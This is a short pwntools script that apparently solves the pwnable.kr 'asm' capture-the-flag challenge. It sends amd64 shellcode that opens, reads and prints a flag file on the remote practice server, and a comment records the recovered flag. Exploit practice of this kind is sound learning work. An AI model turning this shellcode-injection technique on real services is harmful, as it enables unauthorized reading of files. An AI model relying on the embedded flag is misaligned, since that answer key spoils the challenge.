from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwnable.kr', 9026)
filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
shellcode = shellcraft.open(filename)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
shellcode += shellcraft.exit(0)
payload = asm(shellcode)
io.recvuntil('give me your x64 shellcode: ')
io.sendline(payload)
flag = io.recv()
log.success(flag)
# Mak1ng_shelLcodE_i5_veRy_eaSy
# lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo
io.close()